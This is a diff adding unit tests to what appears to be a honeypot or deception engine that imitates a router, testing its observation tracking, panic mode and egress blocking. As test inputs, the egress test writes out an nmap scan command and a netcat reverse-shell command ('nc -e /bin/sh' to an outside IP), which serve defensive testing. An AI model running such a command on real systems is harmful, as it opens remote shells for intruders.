@@ -78,6 +78,46 @@ def test_quantum_superposition_logic():
     collapse = engine.q_collapse()
     assert isinstance(collapse, bool)
 
+def test_observer_effect():
+    engine = CerberusUnifiedEngine()
+    attacker_ip = "10.0.0.99"
+    cmd = "ls"
+
+    # Run command multiple times to trigger observer effect
+    for _ in range(6):
+        engine.think(cmd, {"name": "Test Router"}, attacker_ip=attacker_ip)
+
+    # Level should be > 0.5 because (6-1)/5 = 1.0
+    obs_lvl = engine._get_observation_level(attacker_ip)
+    assert obs_lvl >= 1.0
+
+    # Check if logic shifts
+    is_intercept, logic, resp = engine.think(cmd, {"name": "Test Router"}, attacker_ip=attacker_ip)
+    assert "High Observation" in logic
+
+def test_panic_mode_trigger():
+    engine = CerberusUnifiedEngine()
+    # Test direct kill command
+    is_intercept, logic, resp = engine.think("shutdown -h now", {"name": "Test Router"})
+    assert "Kernel Panic" in logic
+    assert engine.panic_mode == True
+
+    # Verify subsequent commands stay in panic mode
+    is_intercept, logic, resp = engine.think("ls", {"name": "Test Router"})
+    assert "Kernel Panic" in logic
+
+def test_egress_filtering():
+    engine = CerberusUnifiedEngine()
+    # Test nmap scan block
+    is_intercept, logic, resp = engine.think("nmap -sV 8.8.8.8", {"name": "Test Router"})
+    assert logic == "EGRESS BLOCK"
+    assert "Egress scan detected" in resp
+
+    # Test reverse shell block
+    is_intercept, logic, resp = engine.think("nc -e /bin/sh 1.2.3.4 4444", {"name": "Test Router"})
+    assert logic == "EGRESS BLOCK"
+    assert "Suspicious outbound" in resp
+
 def test_adversarial_memory_tracking():
     client = LLMClient()
     dummy_ip = "1.2.3.4"
